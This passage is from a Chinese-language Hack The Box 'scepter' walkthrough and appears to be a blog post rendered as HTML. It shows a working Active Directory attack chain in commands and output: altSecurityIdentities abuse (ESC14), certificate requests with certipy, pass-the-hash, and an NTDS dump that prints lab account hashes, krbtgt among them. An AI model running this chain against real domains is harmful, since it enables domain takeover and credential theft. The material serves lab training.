+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute2: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute1: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-GeoCoordinatesLongitude: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-GeoCoordinatesLatitude: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-GeoCoordinatesAltitude: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-CredentialRoamingTokens: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-FailedInteractiveLogonCount: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-LastFailedInteractiveLogonTime: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-LastSuccessfulInteractiveLogonTime: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-SupportedEncryptionTypes: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKIAccountCredentials: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKIDPAPIMasterKeys: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKIRoamingTimeStamp: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mSMQDigests: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mSMQSignCertificates: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userSharedFolderOther: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userSharedFolder: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otherIpPhone: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ipPhone: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;assistant: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;primaryInternationalISDNNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;primaryTelexNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otherMobile: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otherFacsimileTelephoneNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userCert: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;homePostalAddress: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;personalTitle: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wWWHomePage: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otherHomePhone: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;streetAddress: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otherPager: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;info: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;otherTelephone: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userCertificate: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;preferredDeliveryMethod: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;registeredAddress: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;internationalISDNNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x121Address: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;facsimileTelephoneNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;teletexTerminalIdentifier: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;telexNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;telephoneNumber: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;physicalDeliveryOfficeName: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;postOfficeBox: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;postalCode: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;postalAddress: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;street: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;st: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;p.adams,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Helpdesk Enrollment Certificate,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;altSecurityIdentities: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个p.adams用户能打dcsync&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-5.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很明了了，能写altSecurityIdentities就意味着能重新打一次esc14&lt;/p&gt;
+&lt;p&gt;查看一下这个用户是否存在altSecurityIdentities&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $FQDN -d scepter.htb -k get object p.adams --attr altSecurityIdentities 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;p.adams,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Helpdesk Enrollment Certificate,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不存在，给它写一个，注意这里其实能随意写，只要后面能正常对应就行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $FQDN -d $domain -k set object p.adams altSecurityIdentities -v &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X509:&amp;lt;RFC822&amp;gt;wackymaker@scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; p.adams&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s altSecurityIdentities has been updated
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后和之前一样的打法&lt;/p&gt;
+&lt;p&gt;因为环境恢复脚本的原因,前面的部分操作我需要重复操作&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 add genericAll &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&amp;#34;&lt;/span&gt; a.carter
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; a.carter has now GenericAll on OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;STAFF ACCESS CERTIFICATE,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SCEPTER,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;HTB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $FQDN -d $domain -k set object p.adams altSecurityIdentities -v &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X509:&amp;lt;RFC822&amp;gt;wackymaker@scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; p.adams&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s altSecurityIdentities has been updated
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 set object d.baker mail -v wackymaker@scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] d.baker&amp;#39;&lt;/span&gt;s mail has been updated
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy req -username d.baker@scepter.htb -hashes :$hash -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip $ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Requesting certificate via RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Request ID is &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully requested certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got certificate without identity
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Certificate has no object SID
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Try using -sid to set the object SID or see the wiki &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more details
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Saving certificate and private key to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker.pfx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wrote certificate and private key to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker.pfx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy auth -pfx d.baker.pfx -dc-ip $ip -domain scepter.htb -username p.adams
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Certificate identities:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     No identities found in this certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Could not find identity in the provided certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Using principal: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p.adams@scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to get TGT...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got TGT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Saving credential cache to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p.adams.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wrote credential cache to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p.adams.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to retrieve NT hash &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p.adams&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got hash &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p.adams@scepter.htb&amp;#39;&lt;/span&gt;: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功获取管理权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc smb -dc-ip $ip -u p.adams -H 1b925c524f447bb821a8789c4b118ce0 --ntds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &amp;lt;user&amp;gt; to dump a specific user safely or the module -M ntdsutil &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; y
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; / Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC01&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domin:scepter.htb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Null Auth:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; c-ip&lt;span style=&#34;color:#ae81ff&#34;&gt;\p&lt;/span&gt;.adams:1b925c524f447bb821a8789c4b118ce0 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Dumping the NTDS, this could take a &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; so go grab a redbull...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
